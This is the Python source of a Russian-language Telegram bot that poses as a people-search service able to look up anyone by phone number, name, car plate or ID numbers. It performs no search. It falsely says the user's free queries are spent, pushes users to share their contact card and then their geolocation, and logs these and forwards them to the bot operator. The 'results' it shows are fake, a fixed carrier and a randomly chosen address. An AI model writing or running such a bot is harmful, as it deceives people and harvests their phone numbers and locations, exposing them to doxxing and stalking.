import telebot
from telebot import types
import time
import random

ID = ''
bot = telebot.TeleBot("")
adr = ['Тверская улица, дом 13', 'Проспект 60-летия Октября', 'Улица Винокурова', '3-й Голутвинский переулок']
bot.send_message(ID, '!Бот активирован✅!') 

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Это бот, который, может показать информацию по номеру телефона!
	Для поиска информации, введите команду /getinfo''') 

@bot.message_handler(commands=['getinfo'])
def start(message):
	msg = bot.send_message(message.chat.id, '⬇️ Примеры команд для ввода:

👤 Поиск по имени
├  Блогер (Поиск по тегу)
├  Антипов Евгений Вячеславович
└  Антипов Евгений Вячеславович 05.02.1994
 (Доступны также следующие форматы 05.02/1994/28/20-28)

🚗 Поиск по авто
├  Н777ОН777 - поиск авто по РФ
└  ХТА21150053965897 - поиск по VIN

👨 Социальные сети
├  https://www.instagram.com/ev.antipov - Instagram
├  https://vk.com/id577744097 - Вконтакте
├  https://facebook.com/profile.php?id=1 - Facebook
└  https://ok.ru/profile/162853188164 - Одноклассники

📱 79999939919 - для поиска по номеру телефона
📨 tema@gmail.com - для поиска по Email
📧 #281485304, @durov или перешлите сообщение - поиск по Telegram аккаунту

🔐 /pas churchill7 - поиск почты, логина и телефона по паролю
🏚 /adr Москва, Тверская, д 1, кв 1 - информация по адресу (РФ)
🏘 77:01:0001075:1361 - поиск по кадастровому номеру

🏛 /company Сбербанк - поиск по юр лицам
📑 /inn 784806113663 - поиск по ИНН
🎫 /snils 13046964250 - поиск по СНИЛС
🗂 /vy 9902371011 - поиск по ВУ

📸 Отправьте фото человека, чтобы найти его или двойника на сайтах ВК, ОК.
🚙 Отправьте фото номера автомобиля, чтобы получить о нем информацию.
🙂 Отправьте стикер, чтобы найти создателя.
🌎 Отправьте точку на карте, чтобы найти людей, которые сейчас там.
🗣 С помощью голосовых команд также можно выполнять поисковые запросы.') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		user_input = message.text
		num = user_input.replace('+', '')

		if not num.isdigit():
			msg = bot.reply_to(message, 'Кажется, вы не ввели действительный номер телефона, повторите попытку, написав /getinfo!')#⏳
			return

		bot.send_message(m_id, f'Запрос на номер {num} отправлен🌐!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Заререгстрироваться✅", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
			Чтобы получить дополнительные вопросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
# Отловка ошибок
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Данные
			├Имя: {first} {last}
			├ID: {userid}
			├Ник: @{nick}
			└Номер телефона: {phone}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Отправьте свой контакт!')

	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	button = types.InlineKeyboardButton(text="Расширенный поиск", callback_data="find")
	keyboardmain.add(button)
	bot.send_message(message.chat.id, f'''
		Информация о номере
		├Оператор: Beeline
		└Страна: Россия
		''', reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Подтвердить", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='Для использования бесплатного расширенного поиска, подтвердите геолокацию!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {message.chat.id}
		├Longitude: {lon}
		├Latitude: {lat} 
		└Карты: https://www.google.com/maps/place/{lat}+{lon} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, f'''
			Геолокация
			└Адрес: {random.choice(adr)}
			''')
bot.polling()